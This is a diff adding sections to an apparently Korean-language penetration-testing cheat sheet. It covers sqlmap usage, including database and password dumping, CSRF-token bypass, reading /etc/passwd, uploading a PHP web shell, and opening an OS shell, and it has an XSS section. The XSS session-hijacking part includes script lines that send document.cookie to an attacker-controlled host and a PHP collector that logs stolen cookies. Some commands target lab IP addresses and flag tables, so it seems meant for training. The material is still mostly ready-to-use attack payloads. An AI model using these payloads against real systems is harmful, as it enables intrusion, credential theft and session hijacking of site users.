@@ -320,3 +320,185 @@ SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
 ### Writing a Web Shell
 ```cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -```
 
+<br/><br/>
+# SQLMap
+
+### SQLMap 설치
+```sudo apt install sqlmap```<br/>
+매뉴얼 설치 : ```git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev```
+
+### SQLMap Start (--batch : 기본 옵션)
+```sqlmap -u "http://www.example.com/vuln.php?id=1" --batch```
+
+### Curl 명령 (HTTP 요청)
+```sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'```
+
+### POST 요청
+```sqlmap 'http://www.example.com/' --data 'uid=1&name=test'```
+
+### 전체 HTTP 요청 (캡쳐된 HTTP 요청 사용)
+```sqlmap -r req.txt```
+
+### 사용자 정의 SQLMap 요청
+```
+sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+sqlmap -u www.target.com --data='id=1' --method PUT
+```
+
+### Prefix/Suffix
+```sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"```
+
+### Level/Risk
+```sqlmap -u www.example.com/?id=1 -v 3 --level=5```
+
+### UNION SQLi 튜닝
+```
+sqlmap -u "http://94.237.54.42:37117/case5.php?id=1" --dump -T flag5 --level=5 --risk=3 --no-cast
+sqlmap -u "http://94.237.54.42:37117/case5.php?id=1" --batch --dump -T flag5 -D testdb --no-cast --dbms=MySQL --technique=T --time-sec=10 --level=5 --risk=3 --fresh-queries
+```
+-  sqlmap -u "http://94.237.58.147:57029/case6.php?col=id" --batch --dump --prefix='`)'
+-  sqlmap -u "http://94.237.58.147:57029/case7.php?id=1" --batch --dump -D testdb --no-cast --dbms=MySQL --union-cols=5
+
+<br/><br/>
+## 1. 데이터베이스 열거
+
+### Basic DB Data 열거
+```sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba```
+
+### 테이블 열거
+```sqlmap -u "http://www.example.com/?id=1" --tables -D testdb```<br/>
+```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb```
+
+### 테이블/행 열거
+```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname```<br/>
+```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3```
+
+### 조건 열거
+```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"```
+
+### 전체 DB 열거
+```sqlmap -u "http://94.237.58.147:32720/case1.php?id=1" --batch --dump -D testdb -T flag1 --no-cast --dbms=MySQL```
+
+## 2. Advanced Database 열거
+
+### DB 스키마 열거
+```sqlmap -u "http://www.example.com/?id=1" --schema```
+
+### 데이터 검색
+```sqlmap -u "http://www.example.com/?id=1" --search -T user```<br/>
+```sqlmap -u "http://www.example.com/?id=1" --search -C pass```
+
+### 비밀번호 열거 및 cracking
+```sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users```
+
+### DB 사용자 비밀번호 열거 및 cracking
+```sqlmap -u "http://www.example.com/?id=1" --passwords --batch```
+
+## 3. 웹 애플리케이션 보호 우회
+
+### Anti-CSRF Token Bypass
+```sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"```
+
+### Unique Value Bypass
+```sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI```
+
+### 계산된 Parameter Bypass
+```sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI```
+
+### 기타 우회
+```sqlmap -u "http://94.237.58.147:32720/case8.php" --data="id=1&t0ken=obDoPdz6ZhgfhUmxYp9VbLhAKDnPkIFEDILj6u0pUAs" --csrf-token="t0ken" -T flag8 --dump```<br/>
+```sqlmap -u "http://94.237.58.147:32720/case9.php?id=1&uid=87808050" --randomize=uid --batch -T flag9 --dump```<br/>
+```sqlmap -u "http://94.237.58.106:53037/case10.php" --data="id=1" --random-agent -T flag10 --dump```<br/>
+```sqlmap -u "http://94.237.58.106:53037/case11.php?id=1" --tamper=between -T flag11 --dump```
+
+## 4. OS Exploitation
+
+### DBA 권한 확인
+```sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba```<br/>
+```sqlmap -u "http://www.example.com/?id=1" --is-dba```
+
+### 로컬 파일 읽기
+```
+sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
+```
+
+### 로컬 파일 쓰기
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+curl http://www.example.com/shell.php?cmd=ls+-la
+```
+
+## 5. OS 명령 실행
+
+```sqlmap -u "http://www.example.com/?id=1" --os-shell```<br/>
+```sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E```  # Error-based SQLi
+
+<br/><br/>
+# XSS 
+
+### Stored XSS
+```<script>alert(window.origin)</script>```
+
+### DOM 공격
+```<img src="" onerror=alert(window.origin)>```
+
+## XSS Discovery
+
+### Automated Discovery (XSS Strike)
+```
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+```
+- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
+- [XSSer](https://github.com/epsylon/xsser)
+
+## Manual Discovery
+
+### XSS Payloads
+- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
+- [PayloadBox](https://github.com/payloadbox/xss-payload-list)
+
+## 세션 하이재킹
+
+### Loading a Remote Script
+```><script src="http://OUR_IP/script.js"></script>```
+
+### script.js
+```
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+### index.php
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
